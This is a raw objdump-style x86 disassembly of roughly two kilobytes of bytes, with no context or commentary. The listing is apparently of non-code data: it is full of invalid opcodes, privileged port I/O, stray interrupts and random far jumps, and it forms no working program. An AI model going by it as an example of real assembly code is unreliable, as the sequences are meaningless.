  404ab0:	xor    ch,cl
  404ab2:	mov    bh,0x8f
  404ab4:	push   edx
  404ab5:	imul   edx,DWORD PTR [eax+0x7fe6d7ca],0xffffff87
  404abc:	sub    cl,BYTE PTR ss:[ecx-0x4e4a08ff]
  404ac3:	mov    WORD PTR [ecx+eax*2+0x44],cs
  404ac7:	mov    BYTE PTR [edi-0x70],ah
  404aca:	mov    ds:0x65136fc3,eax
  404acf:	fistp  QWORD PTR [ebp-0x71]
  404ad2:	je     0x404b35
  404ad4:	adc    eax,0xc4cf7551
  404ad9:	mov    DWORD PTR [ebx-0x51bf5d36],ecx
  404adf:	adc    ecx,DWORD PTR [ecx-0x452dfc34]
  404ae5:	pop    esi
  404ae6:	outs   dx,DWORD PTR ds:[esi]
  404ae7:	lahf   
  404ae8:	sub    eax,DWORD PTR [ebp+0x3537a465]
  404aee:	ret    0xfaac
  404af1:	test   DWORD PTR [esi+0x116daf67],edi
  404af7:	aas    
  404af8:	add    al,0xc8
  404afa:	push   ebx
  404afb:	stos   DWORD PTR es:[edi],eax
  404afc:	mov    ss,WORD PTR [edx]
  404afe:	cmp    esi,DWORD PTR [esi+0x38]
  404b01:	xchg   edx,eax
  404b02:	inc    ecx
  404b04:	jae    0x404b5c
  404b06:	retf   0xfbe2
  404b09:	xchg   bl,al
  404b0b:	dec    ebp
  404b0c:	ss loopne 0x404b31
  404b0f:	loope  0x404aff
  404b11:	sbb    ebx,DWORD PTR [ebx-0x36edde01]
  404b17:	loop   0x404b09
  404b19:	xchg   edi,eax
  404b1a:	xor    DWORD PTR ds:0xba8c0713,ebp
  404b20:	jl     0x404af2
  404b22:	add    ebp,eax
  404b24:	addr16 add esi,edx
  404b27:	jb     0x404b14
  404b29:	xchg   ecx,eax
  404b2a:	arpl   bp,di
  404b2c:	scas   eax,DWORD PTR es:[edi]
  404b2d:	adc    esp,eax
  404b2f:	stos   DWORD PTR es:[edi],eax
  404b30:	sbb    al,BYTE PTR [ebx+esi*8-0x3c7dd40c]
  404b37:	pushf  
  404b38:	push   0xffffffc4
  404b3a:	daa    
  404b3b:	bound  ebp,QWORD PTR [eax]
  404b3d:	daa    
  404b3e:	std    
  404b3f:	das    
  404b40:	test   eax,0x2b870fa1
  404b45:	sbb    al,0x45
  404b47:	cs jbe 0x404b4b
  404b4a:	inc    esi
  404b4b:	mov    ebp,0xfc34563
  404b50:	or     ebp,esp
  404b52:	or     BYTE PTR [eax+0x38],dl
  404b55:	retf   0x6b9c
  404b58:	xor    DWORD PTR [ecx+0x143c9b25],esi
  404b5e:	in     al,dx
  404b5f:	ficomp DWORD PTR [edi+0x797b1bfd]
  404b65:	add    ebx,DWORD PTR [edx]
  404b67:	dec    ebx
  404b68:	call   0x2329e729
  404b6d:	xor    eax,DWORD PTR [ebx]
  404b6f:	push   ebx
  404b70:	aam    0xe1
  404b72:	inc    edx
  404b73:	test   ecx,ebp
  404b75:	xor    DWORD PTR [edx],eax
  404b77:	test   BYTE PTR [ebx+0x79],al
  404b7a:	sub    DWORD PTR [eax+0x32],esp
  404b7d:	add    eax,0xc536af80
  404b82:	sbb    al,0xdf
  404b84:	daa    
  404b85:	popa   
  404b86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b87:	ret    0xe695
  404b8a:	es add esp,DWORD PTR gs:[ecx+0x76]
  404b8f:	mov    ebp,ss
  404b91:	adc    BYTE PTR [ebx],cl
  404b93:	add    ah,BYTE PTR [ecx-0x6a]
  404b96:	lods   eax,DWORD PTR ds:[esi]
  404b97:	scas   eax,DWORD PTR es:[edi]
  404b98:	inc    ecx
  404b99:	xchg   esi,eax
  404b9a:	mov    bl,0x8d
  404b9c:	das    
  404b9d:	mov    ebx,0xc4aa762
  404ba2:	out    0xe3,eax
  404ba4:	cmc    
  404ba5:	aaa    
  404ba6:	and    al,0xe6
  404ba8:	push   cs
  404ba9:	or     eax,0x33328c33
  404bae:	loopne 0x404b4e
  404bb0:	mov    esi,0x477873c7
  404bb5:	add    DWORD PTR [esi-0x7c329176],edi
  404bbb:	pusha  
  404bbc:	cdq    
  404bbd:	xor    DWORD PTR [eax],esi
  404bbf:	cwde   
  404bc0:	(bad)  
  404bc1:	sti    
  404bc2:	jp     0x404bbc
  404bc4:	addr16 daa 
  404bc6:	mov    ah,BYTE PTR [edi]
  404bc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bc9:	xchg   edi,eax
  404bca:	push   ebp
  404bcb:	aad    0xab
  404bcd:	pop    ebx
  404bce:	pusha  
  404bcf:	aas    
  404bd0:	inc    edx
  404bd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bd2:	jmp    0xbe130f8b
  404bd7:	lods   al,BYTE PTR ds:[esi]
  404bd8:	out    0xa1,al
  404bda:	pop    ss
  404bdb:	mov    ecx,0x8c9c826f
  404be0:	add    cl,0xad
  404be3:	push   edi
  404be4:	stos   BYTE PTR es:[edi],al
  404be5:	stos   DWORD PTR es:[edi],eax
  404be6:	(bad)  
  404be7:	test   al,0xfb
  404be9:	out    0xa7,eax
  404beb:	loope  0x404c34
  404bed:	pop    ecx
  404bee:	retf   
  404bef:	xchg   BYTE PTR [edx-0x5ffa5471],dh
  404bf5:	add    ah,BYTE PTR [eax]
  404bf7:	mov    WORD PTR [eax],?
  404bf9:	ror    BYTE PTR [ebx+0x407522f0],0xf8
  404c00:	push   0xffffff8c
  404c02:	arpl   WORD PTR [bp+di+0x729a],ax
  404c07:	mov    esp,0xb9efa13a
  404c0c:	sti    
  404c0d:	sub    BYTE PTR [esi],0x8c
  404c10:	push   es
  404c11:	jecxz  0x404c48
  404c13:	nop
  404c14:	add    DWORD PTR [edx],ebx
  404c16:	mov    esi,0x15bd5edc
  404c1b:	inc    edi
  404c1c:	push   edx
  404c1d:	or     bl,0xea
  404c20:	and    al,0x77
  404c22:	test   al,0x2
  404c24:	push   ecx
  404c25:	ja     0x404bb2
  404c27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c28:	int3   
  404c29:	int    0x6f
  404c2b:	pusha  
  404c2c:	jg     0x404c5f
  404c2e:	scas   al,BYTE PTR es:[edi]
  404c2f:	jmp    0xb931:0x51aa1184
  404c36:	out    0x6e,al
  404c38:	mov    dl,0x51
  404c3a:	mov    dl,0x1f
  404c3c:	xor    edx,DWORD PTR ds:0xc1e08cb1
  404c42:	or     ecx,ebx
  404c44:	stos   BYTE PTR es:[edi],al
  404c45:	pop    ecx
  404c46:	sar    al,1
  404c48:	fsubp  st(3),st
  404c4a:	imul   esi,DWORD PTR [ebx-0x4e],0xffffff8f
  404c4e:	loopne 0x404c56
  404c50:	mov    esi,0x53b1a33f
  404c55:	leave  
  404c56:	movsx  edx,WORD PTR [eax]
  404c59:	mov    edx,fs
  404c5b:	test   DWORD PTR [eax],esp
  404c5d:	mov    ch,0xf1
  404c5f:	inc    edi
  404c60:	fcom   DWORD PTR [ebx+edx*1-0x79d0d52d]
  404c67:	loop   0x404c05
  404c69:	or     al,0x5f
  404c6b:	jecxz  0x404c18
  404c6d:	aaa    
  404c6e:	pop    edx
  404c6f:	out    0x52,al
  404c71:	adc    al,0x95
  404c73:	shr    ecx,cl
  404c75:	push   edi
  404c76:	push   ds
  404c77:	inc    esi
  404c78:	jae    0x404cf3
  404c7a:	xor    bh,bh
  404c7c:	push   esi
  404c7d:	adc    esp,ebx
  404c7f:	mov    cl,dl
  404c81:	int    0x1d
  404c83:	pusha  
  404c84:	jnp    0x404cb7
  404c86:	mov    esi,0x474c88c8
  404c8b:	clc    
  404c8c:	addr16 inc edi
  404c8e:	test   BYTE PTR [edi],ah
  404c90:	int3   
  404c91:	xchg   edi,eax
  404c92:	add    eax,0xca5b35d5
  404c97:	es push es
  404c99:	jmp    0xa753:0x69d2613a
  404ca0:	sahf   
  404ca1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ca2:	jno    0x404c59
  404ca4:	sbb    DWORD PTR [ecx],edi
  404ca6:	dec    ebx
  404ca7:	mov    eax,0x50583e8
  404cac:	jb     0x404d25
  404cae:	and    al,0xa7
  404cb0:	and    cl,ch
  404cb2:	out    dx,eax
  404cb3:	pusha  
  404cb4:	lahf   
  404cb5:	xor    DWORD PTR [esi-0x38],ebp
  404cb8:	out    dx,al
  404cb9:	je     0x404c6e
  404cbb:	loopne 0x404d02
  404cbd:	icebp  
  404cbe:	dec    ebx
  404cbf:	jl     0x404cb4
  404cc1:	shl    ecx,0x43
  404cc4:	stos   BYTE PTR es:[edi],al
  404cc5:	mov    cl,0xd0
  404cc7:	sub    dh,bl
  404cc9:	icebp  
  404cca:	imul   edx,DWORD PTR [ebx-0x151fbe4e],0xffffffbe
  404cd1:	stos   DWORD PTR es:[edi],eax
  404cd2:	xor    eax,0x2e022778
  404cd7:	ror    BYTE PTR [eax+0x24],0x2a
  404cdb:	cmp    eax,DWORD PTR [edi]
  404cdd:	mov    eax,ds:0xff6b388a
  404ce2:	add    DWORD PTR [edi-0x375114fd],edx
  404ce8:	mov    al,0x94
  404cea:	sbb    eax,0xe23b67f8
  404cef:	daa    
  404cf0:	jmp    0xd37e:0xd779cb92
  404cf7:	dec    esi
  404cf8:	fmul   DWORD PTR [ecx+0x67]
  404cfb:	dec    edi
  404cfc:	mov    DWORD PTR [edx-0x5e9543a4],ebx
  404d02:	mov    eax,ds:0xaa8257b9
  404d07:	mov    WORD PTR [esi-0x553c983f],fs
  404d0d:	aaa    
  404d0e:	shl    BYTE PTR [eax-0x42afb228],1
  404d14:	retf   
  404d15:	and    eax,0x8c732836
  404d1a:	data16 aas 
  404d1c:	adc    al,BYTE PTR es:[ebx]
  404d1f:	xchg   ebp,eax
  404d20:	jp     0x404caf
  404d22:	mov    dl,0xf8
  404d24:	sub    dh,BYTE PTR [ecx]
  404d26:	rcl    BYTE PTR [edi],0x56
  404d29:	xchg   ebp,eax
  404d2a:	mov    ds:0xa21a53c3,al
  404d2f:	xchg   bl,bh
  404d31:	pushf  
  404d32:	popf   
  404d33:	les    esp,FWORD PTR [ebp-0x76]
  404d36:	fist   DWORD PTR [ebx+esi*8+0x7e531ad]
  404d3d:	pop    ss
  404d3e:	mov    ds,WORD PTR [edx-0x35]
  404d41:	popa   
  404d42:	jmp    0x404d3c
  404d44:	icebp  
  404d45:	fwait
  404d46:	adc    al,0xd1
  404d48:	jecxz  0x404d79
  404d4a:	xor    ah,BYTE PTR [edi-0x4e]
  404d4d:	sbb    cl,BYTE PTR [edx-0x74]
  404d50:	add    cl,0x47
  404d53:	test   eax,0xeed05faa
  404d58:	fidiv  WORD PTR [edi+0x17b2eb6b]
  404d5e:	in     al,0x42
  404d60:	cs pusha 
  404d62:	test   eax,eax
  404d64:	inc    edi
  404d65:	cdq    
  404d66:	mov    ebx,0x458c931c
  404d6b:	aad    0x69
  404d6d:	pop    ebx
  404d6e:	cli    
  404d6f:	aas    
  404d70:	aam    0xa7
  404d72:	aas    
  404d73:	mov    ch,0x2f
  404d75:	jmp    0xc5323fc
  404d7a:	stc    
  404d7b:	jecxz  0x404d6c
  404d7d:	aaa    
  404d7e:	jle    0x404d66
  404d80:	push   esp
  404d81:	adc    al,0x81
  404d83:	shl    DWORD PTR [ecx-0x6718a389],cl
  404d89:	int    0x77
  404d8b:	pusha  
  404d8c:	addr16 xor esi,esi
  404d8f:	jmp    0xe367:0x5a88bde
  404d96:	mov    ch,0xa2
  404d98:	and    al,0x8c
  404d9a:	mov    ch,0xb1
  404d9c:	pop    ecx
  404d9d:	mov    eax,ds:0x8c5ebf0e
  404da2:	scas   eax,DWORD PTR es:[edi]
  404da3:	js     0x404e04
  404da5:	add    DWORD PTR [eax-0x70365376],ebp
  404dab:	js     0x404d90
  404dad:	fcmovne st,st(3)
  404daf:	jle    0x404e1c
  404db1:	popa   
  404db2:	add    DWORD PTR [edi],eax
  404db4:	add    esp,DWORD PTR [edi-0x42]
  404db7:	jmp    0x3931:0xc9aacf9c
  404dbe:	out    0xb2,al
  404dc0:	mov    dl,0x8f
  404dc2:	stos   DWORD PTR es:[edi],eax
  404dc3:	addps  xmm0,XMMWORD PTR [edx]
  404dc6:	sub    BYTE PTR [edx+eiz*1-0x55a6623f],cl
  404dcd:	adc    eax,0xffffffd8
  404dd0:	fsubrp st(3),st
  404dd2:	imul   esp,DWORD PTR [ebx-0x791fd04e],0xffffffbe
  404dd9:	mov    ebx,ecx
  404ddb:	cmp    eax,0x44cbc5da
  404de0:	jae    0x404e2f
  404de2:	xor    DWORD PTR [ebx+0x6],ecx
  404de5:	mov    ?,WORD PTR [bp+si]
  404de8:	push   eax
  404de9:	xchg   esp,eax
  404dea:	popa   
  404deb:	pop    eax
  404dec:	mov    ds:0xd8a7533d,eax
  404df1:	mov    dh,0xa5
  404df3:	rcl    BYTE PTR [ecx+0x31],1
  404df6:	retf   
  404df7:	(bad)  
  404df8:	mov    esi,0xd7861d1
  404dfd:	add    ah,dl
  404dff:	lahf   
  404e00:	ret    
  404e01:	lea    ebp,[edx]
  404e03:	or     DWORD PTR [ebp+0x11],edx
  404e06:	and    al,0x8a
  404e08:	sub    ch,cl
  404e0a:	out    0x60,eax
  404e0c:	fwait
  404e0d:	xor    DWORD PTR [edx-0x16],ebp
  404e10:	pusha  
  404e11:	or     DWORD PTR [edx-0x199cce8f],ebp
  404e17:	into   
  404e18:	mov    dl,0xd1
  404e1a:	mov    dl,0xb7
  404e1c:	add    DWORD PTR ds:0xce48086,esp
  404e22:	xor    eax,0xf1ddba60
  404e27:	test   al,0xeb
  404e29:	xchg   ecx,eax
  404e2a:	adc    dl,al
  404e2c:	sub    ebx,DWORD PTR [edx]
  404e2e:	xor    bl,bl
  404e30:	dec    eax
  404e31:	sub    al,0x2a
  404e33:	sub    DWORD PTR [edi],eax
  404e35:	fisttp DWORD PTR [edx+0x312d6b18]
  404e3b:	jne    0x404e98
  404e3d:	jb     0x404ea1
  404e3f:	mov    BYTE PTR [ebp-0x7a],bh
  404e42:	sbb    edx,ebx
  404e44:	sub    al,BYTE PTR [ebx]
  404e46:	inc    edx
  404e47:	scas   eax,DWORD PTR es:[edi]
  404e48:	and    al,0x1
  404e4a:	sti    
  404e4b:	cwde   
  404e4c:	sub    dl,BYTE PTR ds:0x97da2f47
  404e52:	jg     0x404e27
  404e54:	mov    ebp,0xd8dfcc95
  404e59:	jmp    0x404ec2
  404e5b:	lods   eax,DWORD PTR ds:[esi]
  404e5c:	imul   ebx,DWORD PTR [edx-0x5e19430c],0x2b
  404e63:	mov    ebp,0x66125acd
  404e68:	repz cmp eax,0x830155b2
  404e6e:	xchg   ah,dl
  404e70:	cmp    cl,BYTE PTR [ebp-0x4e]
  404e73:	mov    bh,0x98
  404e75:	cmc    
  404e76:	shl    DWORD PTR [ebx+esi*8],cl
  404e79:	ror    DWORD PTR [edi-0x55698e3f],0x9d
  404e80:	xchg   esi,eax
  404e81:	fs pop ecx
  404e83:	shr    DWORD PTR [edx],cl
  404e85:	popf   
  404e86:	xchg   ecx,eax
  404e87:	lock xchg BYTE PTR [ebp+0x41177263],dl
  404e8e:	retf   
  404e8f:	push   ds
  404e90:	xor    eax,0x2ae54705
  404e95:	add    DWORD PTR [esi-0x556b2434],ecx
  404e9b:	hlt    
  404e9c:	xor    DWORD PTR [eax],eax
  404e9e:	out    0x3e,al
  404ea0:	mov    dl,0x81
  404ea2:	mov    edx,0xd160328b
  404ea7:	mov    eax,0xb5368cd8
  404eac:	and    eax,0xe8c14b12
  404eb1:	xchg   BYTE PTR ds:0xc9576281,al
  404eb7:	mov    ds:0xe6686171,eax
  404ebc:	sbb    bl,BYTE PTR [ebx]
  404ebe:	test   cl,0xf6
  404ec1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ec2:	sti    
  404ec3:	mov    ch,0xcf
  404ec5:	in     eax,dx
  404ec6:	dec    ebx
  404ec7:	mov    esi,0xd311a9d2
  404ecc:	sub    ch,BYTE PTR [ecx]
  404ece:	out    0xe4,al
  404ed0:	mov    bh,0x41
  404ed2:	or     ebx,ecx
  404ed4:	sbb    esi,DWORD PTR [edx+esi*2+0x15acc911]
  404edb:	hlt    
  404edc:	pop    eax
  404edd:	rcl    ebx,0x1c
  404ee0:	hlt    
  404ee1:	test   esp,ebp
  404ee3:	mov    esi,0x9ca22dbb
  404ee8:	cli    
  404ee9:	or     ah,BYTE PTR [esp+eax*1]
  404eec:	jb     0x404ec4
  404eee:	adc    DWORD PTR [edi-0x36651a8d],edi
  404ef4:	fisttp DWORD PTR [eax+eiz*1]
  404ef7:	(bad)  
  404ef8:	cli    
  404ef9:	sbb    eax,0xa28ea41e
  404efe:	sbb    al,0xe4
  404f00:	mov    ebp,0xdfe6ad85
  404f05:	pop    ds
  404f06:	loop   0x404ee3
  404f08:	dec    ebp
  404f09:	mov    ebp,0x13042c1a
  404f0e:	mov    dl,0x13
  404f10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f11:	ins    DWORD PTR es:[edi],dx
  404f12:	gs dec edi
  404f14:	ror    DWORD PTR [esi],cl
  404f16:	loope  0x404f30
  404f18:	dec    ecx
  404f19:	add    eax,0xdb887e0b
  404f1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f1f:	(bad)  
  404f21:	or     eax,0x95614c8c
  404f26:	aas    
  404f27:	std    
  404f28:	jmp    0x3c11:0x79f197fa
  404f2f:	cmp    BYTE PTR [ebx],bh
  404f31:	sti    
  404f32:	sub    DWORD PTR es:[edi],0x6a03d3c2
  404f39:	and    al,0xfb
  404f3b:	icebp  
  404f3c:	fsubp  st(4),st
  404f3e:	inc    ebx
  404f3f:	or     al,ch
  404f41:	pop    ecx
  404f42:	pop    esp
  404f43:	sub    BYTE PTR [edx],0xdc
  404f46:	shl    DWORD PTR [esi],cl
  404f48:	mov    bh,0xb
  404f4a:	or     al,0xf1
  404f4c:	push   0xc634e63d
  404f51:	mov    DWORD PTR [esi],edx
  404f53:	mov    eax,0x824248
  404f58:	mov    esi,0xabe09523
  404f5d:	xor    eax,DWORD PTR [edx+0x5d]
  404f60:	arpl   WORD PTR [ebp+0x75],si
  404f63:	fs scas eax,DWORD PTR es:[edi]
  404f65:	jno    0x404fa7
  404f67:	mov    ds,WORD PTR [ecx-0x5]
  404f6a:	add    eax,ebx
  404f6c:	arpl   sp,dx
  404f6e:	inc    ebp
  404f6f:	add    ebx,edx
  404f71:	add    al,0x22
  404f73:	mov    DWORD PTR [esi-0x151abc91],esp
  404f79:	xchg   esi,eax
  404f7a:	ret    0x20b6
  404f7d:	(bad)  
  404f7e:	repz jns 0x404fb5
  404f81:	lods   al,BYTE PTR ds:[esi]
  404f82:	inc    ebx
  404f83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f84:	in     al,dx
  404f85:	xchg   ebx,eax
  404f86:	ret    
  404f87:	fistp  DWORD PTR [ecx+ebp*1+0x67]
  404f8b:	or     eax,0xbf12fb26
  404f90:	pop    edx
  404f91:	stc    
  404f92:	add    DWORD PTR [ecx-0x532d5aa9],edx
  404f98:	jbe    0x404fd9
  404f9a:	fldln2 
  404f9c:	add    BYTE PTR [esi],al
  404f9e:	pushw  cs
  404fa0:	and    ebp,0x27
  404fa3:	ins    BYTE PTR es:[edi],dx
  404fa4:	push   eax
  404fa5:	adc    esi,ebx
  404fa7:	(bad)  
  404fa9:	jno    0x40501a
  404fab:	imul   ebx,DWORD PTR [edi+0x44],0xffffffc2
  404faf:	or     dh,BYTE PTR [eax-0x6058c59e]
  404fb5:	repnz inc ebp
  404fb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fb8:	adc    DWORD PTR [esi-0x25cddcef],esi
  404fbe:	dec    ebp
  404fbf:	imul   edi,DWORD PTR [ebx+0x1b],0x9a9f7ae7
  404fc6:	loop   0x404ff3
  404fc8:	test   DWORD PTR cs:[ebx+ebp*4+0x3c],esp
  404fcd:	nop
  404fce:	(bad)  
  404fcf:	scas   al,BYTE PTR es:[edi]
  404fd0:	aas    
  404fd1:	pop    ebx
  404fd2:	jp     0x405026
  404fd4:	xor    bl,bh
  404fd6:	mul    dh
  404fd8:	cli    
  404fd9:	wbinvd 
  404fdb:	dec    ebx
  404fdc:	pop    esp
  404fdd:	push   cs
  404fde:	mov    ch,0xd3
  404fe0:	mov    edx,ss
  404fe2:	mov    edx,0x94ff21
  404fe7:	stos   DWORD PTR es:[edi],eax
  404fe8:	fld    QWORD PTR [ebx+0x5a]
  404feb:	xchg   ecx,eax
  404fec:	add    ah,BYTE PTR [eax-0xd845476]
  404ff2:	mov    cl,0x9c
  404ff4:	add    esi,edi
  404ff6:	cmp    bh,BYTE PTR [esi]
  404ff8:	out    dx,al
  404ff9:	rcr    BYTE PTR [ecx],0xec
  404ffc:	mov    bl,0x6
  404ffe:	dec    ebx
  404fff:	mov    cl,0x3a
  405001:	add    bh,BYTE PTR [ebx+0x50747297]
  405007:	inc    eax
  405008:	jo     0x404faf
  40500a:	mov    es,WORD PTR [eax-0x71152c4d]
  405010:	inc    edi
  405011:	int3   
  405012:	mov    ss,WORD PTR [ecx+0x20]
  405015:	xchg   ebp,eax
  405016:	repnz retf 
  405018:	pusha  
  405019:	inc    esi
  40501a:	xor    al,0xe1
  40501c:	and    DWORD PTR [esi-0xa4e51c5],0x1d
  405023:	or     al,0x74
  405025:	test   BYTE PTR [ebp-0x46],ch
  405028:	xchg   edi,eax
  405029:	mov    dl,0xd
  40502b:	push   ecx
  40502c:	shr    DWORD PTR [esi+0x43bd1e7c],0xe3
  405033:	add    eax,DWORD PTR [ebp+0x6]
  405036:	add    eax,0x82d39eb0
  40503b:	jbe    0x405080
  40503d:	mov    ss,WORD PTR [edi-0x2cf7054e]
  405043:	jne    0x404fd5
  405045:	pop    eax
  405046:	gs jnp 0x404ff5
  405049:	arpl   WORD PTR [eax-0xa],sp
  40504c:	jns    0x404fd6
  40504e:	fs push edi
  405050:	out    0x46,eax
  405052:	xchg   esp,eax
  405053:	in     al,0xc7
  405055:	xchg   edx,eax
  405056:	xor    cl,BYTE PTR [edi]
  405058:	out    0xc6,al
  40505a:	adc    esp,DWORD PTR [eax+0x114a29bb]
  405060:	sbb    BYTE PTR [edx+0x47],dl
  405063:	cmp    eax,DWORD PTR [edx]
  405065:	or     BYTE PTR [eax-0x240ab320],ah
  40506b:	enter  0x511a,0xf3
  40506f:	sub    esi,ecx
  405071:	rcl    DWORD PTR [ecx],0xc7
  405074:	inc    esp
  405075:	push   ebp
  405076:	pop    esp
  405077:	jo     0x40503d
  405079:	mov    ah,BYTE PTR [esi-0x3e]
  40507c:	push   ss
  40507d:	int    0x4f
  40507f:	xchg   esi,eax
  405080:	retf   0xe89b
  405083:	inc    eax
  405084:	pusha  
  405085:	and    al,0x35
  405087:	imul   edx,DWORD PTR [edi+esi*8+0x1],0x84f10e74
  40508f:	ss ja  0x405101
  405092:	shl    al,cl
  405094:	sar    eax,0x2e
  405097:	add    DWORD PTR [edx+ebp*2],ebx
  40509a:	ret    
  40509b:	jno    0x4050d7
  40509d:	and    bl,dl
  40509f:	mov    ds:0xec3d9cf6,eax
  4050a4:	cmp    al,0x2a
  4050a6:	fnstenv [edx-0x25]
  4050a9:	test   BYTE PTR [esi+0xd9abc7b],ch
  4050af:	push   0x2a
  4050b1:	push   ds
  4050b2:	adc    ebp,DWORD PTR [ebp-0x42]
  4050b5:	and    esi,DWORD PTR [ebx+edi*1+0x7d]
  4050b9:	arpl   WORD PTR [ebx+0x4185b1e3],si
  4050bf:	scas   al,BYTE PTR es:[edi]
  4050c0:	movntps XMMWORD PTR [edx+0x2fbcad69],xmm5
  4050c7:	bound  edi,QWORD PTR [edi+ecx*1-0x31]
  4050cb:	jno    0x405127
  4050cd:	mov    bl,0xbd
  4050cf:	cmp    ah,dh
  4050d1:	push   cs
  4050d2:	mov    esp,0x7a86ad74
  4050d7:	scas   al,BYTE PTR es:[edi]
  4050d8:	sbb    eax,0xd012d665
  4050dd:	adc    DWORD PTR [ebx],edi
  4050df:	dec    esp
  4050e0:	inc    ecx
  4050e1:	jnp    0x4050b7
  4050e3:	add    eax,0x8ae2d743
  4050e8:	cli    
  4050e9:	mov    ds:0x1822e427,al
  4050ee:	jmp    0x34dc:0x2f82e0a1
  4050f5:	add    ebx,ebp
  4050f7:	ss jp  0x4050c0
  4050fa:	bound  esi,QWORD PTR [edx+esi*2-0x7253498f]
  405101:	fistp  DWORD PTR [edx-0x7f]
  405104:	push   edx
  405105:	jle    0x405137
  405107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405108:	cli    
  405109:	add    ah,BYTE PTR [esi+0x62a9b570]
  40510f:	adc    eax,0x49898248
  405114:	lea    ebp,[ebp+0x2957ef4d]
  40511a:	mov    ch,BYTE PTR [esi]
  40511c:	mov    edx,0xe5be51a3
  405121:	cwde   
  405122:	cmp    bh,bh
  405124:	sub    DWORD PTR [edi],ecx
  405126:	(bad)  
  405127:	repz fcmovne st,st(3)
  40512a:	jmp    FWORD PTR es:[edi+edi*1]
  40512e:	out    dx,al
  40512f:	cs fs sbb eax,0x63a06bbf
  405136:	pop    ebx
  405137:	scas   al,BYTE PTR es:[edi]
  405138:	pop    ebx
  405139:	and    dl,BYTE PTR [edx+0x668e8c54]
  40513f:	sbb    al,0x83
  405141:	cmp    BYTE PTR [ebx+0x4e],dl
  405144:	and    edi,DWORD PTR [esi+0x39547b38]
  40514a:	xchg   esi,eax
  40514b:	daa    
  40514c:	mov    DWORD PTR [edi],ecx
  40514e:	jb     0x405167
  405150:	and    BYTE PTR [ebp+0x1926f907],al
  405156:	shr    BYTE PTR [edx-0x14dd4de4],cl
  40515c:	and    eax,0xe3a1dc1d
  405161:	mov    ds:0xe5239a64,al
  405166:	adc    ah,BYTE PTR [eax+0x32]
  405169:	mov    edi,ecx
  40516b:	daa    
  40516c:	imul   bh
  40516e:	lods   eax,DWORD PTR ds:[esi]
  40516f:	ins    BYTE PTR es:[edi],dx
  405170:	int    0x86
  405172:	scas   eax,DWORD PTR es:[edi]
  405173:	cli    
  405174:	and    al,BYTE PTR [ecx]
  405176:	gs popf 
  405178:	jmp    0x4050fc
  40517a:	mov    ah,0x81
  40517c:	add    eax,0xf789f93e
  405181:	mov    ebp,0x3103c206
  405186:	sbb    dl,BYTE PTR [eax-0x24e17a33]
  40518c:	or     al,0x6c
  40518e:	shl    BYTE PTR [ebx-0x19306202],cl
  405194:	and    BYTE PTR ds:0xb3efa6c0,al
  40519a:	and    eax,0xa4163d10
  40519f:	(bad)  
  4051a0:	stc    
  4051a1:	pop    ecx
  4051a2:	repz cmp DWORD PTR [esi+0x43624ac7],ebx
  4051a9:	push   eax
  4051aa:	sbb    dh,BYTE PTR [esi+ebp*8]
  4051ad:	or     eax,0x356e7804
  4051b2:	aaa    
  4051b3:	icebp  
  4051b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051b5:	enter  0x4e36,0x15
  4051b9:	or     edi,ebx
  4051bb:	loop   0x4051ba
  4051bd:	mov    edx,DWORD PTR [ecx]
  4051bf:	scas   al,BYTE PTR es:[edi]
  4051c0:	pop    eax
  4051c1:	bound  esp,QWORD PTR [ebp-0x397f0adf]
  4051c7:	aas    
  4051c8:	xor    ah,BYTE PTR [eax-0x2c]
  4051cb:	bt     DWORD PTR [esi],eax
  4051ce:	retf   
  4051cf:	mov    ebx,0xf6209ce4
  4051d4:	cmp    bh,bh
  4051d6:	mov    BYTE PTR [ebp+0x3f],ch
  4051d9:	or     DWORD PTR [edx-0x3d8aae80],ecx
  4051df:	int    0x91
  4051e1:	jmp    0x4eae:0x614ddb56
  4051e8:	cmp    DWORD PTR [ebx-0x2712ca0a],ecx
  4051ee:	icebp  
  4051ef:	test   al,0x9c
  4051f1:	push   ebp
  4051f2:	out    dx,eax
  4051f3:	rcl    DWORD PTR [ebp-0x2c],0xc1
  4051f7:	jg     0x405220
  4051f9:	inc    ebp
  4051fa:	lock ds mov edx,0x8a7103ba
  405201:	frstor [ebp-0x1]
  405204:	je     0x405263
  405206:	test   ebx,esp
  405208:	mov    ebp,0x6a86688a
  40520d:	adc    edi,DWORD PTR [ebx+0x3]
  405210:	inc    esi
  405211:	and    BYTE PTR [ebx-0x6d5264d7],al
  405217:	inc    ebp
  405218:	cs xor DWORD PTR es:[ecx+0x75c5d1f3],0x63
  405221:	push   eax
  405222:	jmp    0xb8a0:0xc0572526
  405229:	aam    0x6a
  40522b:	mov    ds:0xacc42a22,eax
  405230:	in     al,0x41
  405232:	sub    DWORD PTR [ecx-0x400df83d],ebp
  405238:	lea    ebp,[ebp+0x1d5f895d]
  40523e:	mov    eax,0xbdb383cd
  405243:	cs push ebp
  405245:	outs   dx,DWORD PTR ds:[esi]
  405246:	push   ebp
  405247:	fadd   QWORD PTR [ecx+0x852285]
  40524d:	jge    0x4051fd
  40524f:	(bad)  
  405250:	std    
  405251:	out    0x5,eax
  405253:	fstp   QWORD PTR [esi+0x36]
  405256:	ret    0x6d1f
  405259:	sbb    DWORD PTR [ebx+0x1307b580],edi
  40525f:	sub    ch,BYTE PTR [edx+0x27]
  405262:	jae    0x405242
  405264:	mov    edx,0xfb394e4b
  405269:	inc    ebx
  40526a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40526b:	jp     0x40521a
  40526d:	pushf  
  40526e:	inc    edx
  40526f:	popa   
  405270:	push   ecx
  405271:	dec    ebx
  405272:	ret    0xe869
  405275:	cld    
  405276:	add    eax,0xd373487e
  40527b:	push   eax
  40527c:	inc    eax
  40527d:	out    dx,al
  40527e:	add    edi,ebx
  405280:	mov    DWORD PTR [ebp+0x269383ab],edi
  405286:	mov    ah,0x94
